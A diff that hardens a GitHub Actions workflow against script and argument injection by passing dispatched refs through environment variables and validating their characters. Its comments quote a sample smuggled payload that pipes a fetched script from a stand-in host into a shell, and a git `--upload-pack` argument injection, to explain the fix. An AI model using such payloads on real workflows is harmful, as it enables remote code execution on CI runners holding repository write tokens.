@@ -49,16 +49,34 @@ jobs:
 
       - name: Resolve the ref to a full sha
         id: ref
+        env:
+          # Through the environment, never `${{ }}` inside the script. An
+          # expression is substituted into the source BEFORE bash parses it, so
+          # a payload of `v1; curl evil.sh | sh` would simply run — on a job
+          # holding `contents: write` and a token that can open pull requests.
+          # The dispatch payload comes from another repository's workflow, which
+          # is exactly the boundary not to trust.
+          RAW_REF: ${{ github.event.client_payload.ref || inputs.ref }}
         run: |
-          REF="${{ github.event.client_payload.ref || inputs.ref }}"
+          REF="$RAW_REF"
           [ -n "$REF" ] || { echo "::error::no ref given"; exit 1; }
+
+          # Belt and braces: a git ref is a conservative charset, and anything
+          # outside it is rejected rather than quoted and hoped for. The leading
+          # dash is excluded separately — `--upload-pack=…` passes a charset
+          # test and is an argument-injection into git.
+          case "$REF" in
+            -*) echo "::error::refusing a ref that starts with a dash: $REF"; exit 1 ;;
+            *[!A-Za-z0-9._/-]*) echo "::error::refusing a ref with unexpected characters: $REF"; exit 1 ;;
+          esac
+
           echo "ref=$REF" >> "$GITHUB_OUTPUT"
 
           # A lightweight tag has no tag object, so `^{}` resolves to nothing —
           # the framework's release.yml creates them with plain `git tag`.
           # Asking for both patterns covers either kind, and the peeled line
           # wins when it exists.
-          OUT=$(git ls-remote https://github.com/kurodaSensei/sumitsubo.git \
+          OUT=$(git ls-remote -- https://github.com/kurodaSensei/sumitsubo.git \
                   "refs/tags/$REF^{}" "refs/tags/$REF" "refs/heads/$REF")
           SHA=$(echo "$OUT" | grep '\^{}$' | cut -f1 | head -1)
           [ -n "$SHA" ] || SHA=$(echo "$OUT" | cut -f1 | head -1)
@@ -72,13 +90,18 @@ jobs:
       - name: Sync the content
         id: sync
         continue-on-error: true
-        run: npm run sync -- --ref "${{ steps.ref.outputs.sha }}" 2>&1 | tee /tmp/sync.log
+        env:
+          SHA: ${{ steps.ref.outputs.sha }}
+        run: npm run sync -- --ref "$SHA" 2>&1 | tee /tmp/sync.log
 
       - name: Explain a refused sync
         if: steps.sync.outcome == 'failure'
+        env:
+          REF: ${{ steps.ref.outputs.ref }}
+          SHA: ${{ steps.ref.outputs.sha }}
         run: |
           {
-            echo "## The sync refused \`${{ steps.ref.outputs.ref }}\`"
+            echo "## The sync refused \`$REF\`"
             echo
             echo '```'
             cat /tmp/sync.log
@@ -91,7 +114,7 @@ jobs:
             echo "By hand, in one commit:"
             echo
             echo "1. \`EXPECTED\` in \`scripts/sync-framework.mjs\` to the counts above."
-            echo "2. \`npm run sync -- --ref ${{ steps.ref.outputs.sha }}\` — it now lists every"
+            echo "2. \`npm run sync -- --ref $SHA\` — it now lists every"
             echo "   page reported \`missing\` or \`stale\`."
             echo "3. Write those Spanish pages under \`content/es/\`. By hand, on purpose."
             echo "4. \`npm run check\`."
@@ -100,6 +123,8 @@ jobs:
 
       - name: Stop early when nothing moved
         id: diff
+        env:
+          SHA: ${{ steps.ref.outputs.sha }}
         run: |
           # --porcelain, not `git diff --quiet`: a sync that writes a NEW page
           # leaves it untracked, which `git diff` does not see. Today the
@@ -108,7 +133,7 @@ jobs:
           # stops being theoretical.
           if [ -z "$(git status --porcelain)" ]; then
             echo "changed=false" >> "$GITHUB_OUTPUT"
-            echo "Already at ${{ steps.ref.outputs.sha }} — nothing to do." >> "$GITHUB_STEP_SUMMARY"
+            echo "Already at $SHA — nothing to do." >> "$GITHUB_STEP_SUMMARY"
           else
             echo "changed=true" >> "$GITHUB_OUTPUT"
           fi
